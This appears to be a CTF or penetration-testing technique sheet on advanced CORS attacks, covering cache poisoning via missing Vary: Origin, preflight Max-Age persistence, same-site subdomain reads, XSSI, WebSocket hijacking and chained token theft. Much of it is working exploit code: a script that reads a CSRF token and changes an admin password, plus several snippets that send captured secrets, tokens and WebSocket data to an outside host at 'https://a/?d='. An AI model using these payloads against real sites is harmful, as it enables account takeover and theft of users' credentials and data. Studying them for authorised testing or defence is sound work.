# Advanced techniques — the non-obvious CORS attacks

The higher-order attacks beyond the basic reflect-and-read — the
chains, the cache interplay, and the subtle bypasses.

---

## 1. The `Vary: Origin` cache-poison — a stored cross-origin leak

```text
a reflected ACAO WITHOUT Vary: Origin — a shared cache keyed only
on the URL. an attacker Origin's reflected ACAO gets cached and
served to EVERY subsequent visitor — a 'stored' cross-origin read
that doesn't need a bot.
```

```bash
# poison the cache with a permissive ACAO
curl -s -i "$BASE/api/me" -H 'Origin: https://attacker.com' \
  -H 'X-Forwarded-Host: attacker.com'  # or a cache-buster
# a subsequent visitor's request gets the cached attacker-ACAO
```

## 2. The `Max-Age` persistence attack — a stale-permission carry

```text
a permissive preflight with a long Max-Age — the browser caches it —
a later CORS 'fix' still uses the cached permissive answer. a real
attack: pre-poison the victim's preflight cache before the fix.
```

## 3. The same-site-cross-origin read — the Lax-cookie bypass

```text
'app.t.com' → 'api.t.com' is CROSS-ORIGIN (CORS applies) but
SAME-SITE (a Lax cookie attaches). a page on a subdomain — a
subdomain XSS, a takeover, or a CTF-supplied sub — reads the
Lax-cookie session on the API. the SameSite defense doesn't apply.
```

## 4. The token-read → arbitrary-write chain — the full exploit

```html
<script>
// read the CSRF token via CORS
fetch('https://t/api/csrf',{credentials:'include'})
 .then(r=>r.json())
 .then(t=>fetch('https://t/api/admin/password',{method:'POST',
    credentials:'include',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({csrf:t.token,new:'attacker'})}))
 .then(r=>fetch('https://a/?done='+r.status))
</script>
```

## 5. The postMessage-amplification — a broadcast + a CORS read

```text
a target page postMessages 'authenticated' to '*' — your iframe
receives it → then fetches the CORS-open endpoint — a two-step
read where the postMessage is the trigger.
```

## 6. The XSSI global-setter — a JS-served endpoint

```html
<script>
// the endpoint sets window.SECRET — capture it
Object.defineProperty(window,'SECRET',{configurable:true,
  set:function(v){fetch('https://a/?d='+v)}});
</script>
<script src="https://t/api/secret.js"></script>
```

## 7. The websocket-Origin-bypass — a CSWSH read

```js
// a ws endpoint checks Origin loosely — or not at all
var w=new WebSocket('wss://t/ws');
// the handshake's cookie rides cross-site — a read+write channel
w.onmessage=e=>fetch('https://a/?d='+e.data);
```

## 8. The iframe-read-via-CORS — a frame that reads

```html
<!-- a CORS-read doesn't need an iframe — but an iframe + a
     postMessage can read a null-allowed endpoint's data back -->
<iframe src="data:text/html,<script>fetch('https://t/api/x',{credentials:'include'}).then(r=>r.text()).then(d=>parent.postMessage(d,'*'))</script>" sandbox="allow-scripts"></iframe>
<script>window.onmessage=e=>fetch('https://a/?d='+e.data)</script>
```

## 9. The `Access-Control-Expose-Headers` token-leak

```text
a token in a response header — X-Token, Authorization — isn't
readable by JS unless Expose-Headers lists it. an endpoint that
exposes its token-header lets a CORS-read capture the credential
for a direct replay.
```

```js
fetch('https://t/api/login',{credentials:'include'})
 .then(r=>{var t=r.headers.get('X-Token');
   fetch('https://a/?t='+t); return r.json()})
```

## 10. The multi-origin chain — a read that feeds a read

```html
<script>
// a chain across two origins — a token from one, a flag from another
fetch('https://a.t.com/api/token',{credentials:'include'})
 .then(r=>r.json())
 .then(t=>fetch('https://b.t.com/api/flag?k='+t.k,{credentials:'include'}))
 .then(r=>r.text()).then(d=>fetch('https://a/?d='+d))
</script>
```

## 11. The CORP/COOP-bypass — a subresource-tag read

```html
<!-- a CORP:same-origin resource can't be loaded cross-origin —
     but a permissive CORS-fetch READ is a different gate —
     CORP gates LOADING, CORS gates READING -->
```

## 12. The service-worker proxy — a persistent reader

```js
// register a service worker that intercepts and proxies the fetch
navigator.serviceWorker.register('data:text/javascript,'+
  encodeURIComponent('self.addEventListener("fetch",e=>{e.respondWith(fetch(e.request))})'));
```

## 13. The `Access-Control-Allow-Origin` race — a TOCTOU check

```text
an origin-check that reads the Origin, validates, then sets ACAO —
a race where the validation and the set are non-atomic — a rare
edge where a crafted request wins the race.
```

## 14. The `Vary`-poison chain — a CORS-read that becomes a stored-leak

```text
a poisoned cache serves the attacker-ACAO to every visitor → every
subsequent visitor's browser trusts YOUR origin → a persistent
cross-origin read without a bot.
```

## 15. The chain-selection — which advanced technique when

```text
a no-Vary reflected ACAO      → the cache-poison chain
a long Max-Age                → the persistence chain
a Lax cookie + same-site sub  → the same-site-cross-origin read
a token endpoint + a write    → the token-read→write chain
a JS-served endpoint          → the XSSI global-setter
a ws endpoint                 → the CSWSH read
an exposed token-header       → the Expose-Headers token-leak
a strict check + a confusion  → the url-parse/encoded bypass
```

## The advanced-technique ledger

```bash
python3 tools/state.py <c> --hypothesis \
  "cors-advanced: <technique> -> <measurement> -> <exploit-path>"
```
